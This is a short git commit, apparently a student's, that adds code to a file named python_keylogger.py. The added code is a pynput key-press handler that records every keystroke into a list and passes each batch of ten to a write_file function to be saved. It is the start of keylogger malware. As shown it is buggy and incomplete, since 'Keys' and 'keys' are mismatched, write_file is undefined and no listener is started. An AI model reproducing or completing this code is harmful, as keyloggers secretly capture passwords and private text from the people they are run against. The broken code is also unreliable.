83289103e51f3bbd4a0ac66dc44b89608731cc51
Olumide Laleye <olaleye@my.bcit.ca>
2021-02-24 13:42:04 -0800

    add more program code

--- python_keylogger.py
+++ python_keylogger.py
@@ -1,7 +1,21 @@
 #import library
 import pynput
 from pynput.keyboard import Key, Listener
-import sys
-from ctypes import *
-from ctypes.wintypes import MSG
-from ctypes.wintypes import DWORD
+
+
+count = 0
+Keys = []
+
+
+
+def on_press(key):
+    global keys, count
+
+    keys.append (key)
+    count += 1
+
+    if count >= 10:
+        count =0
+        write_file(keys)
+        keys = []
+
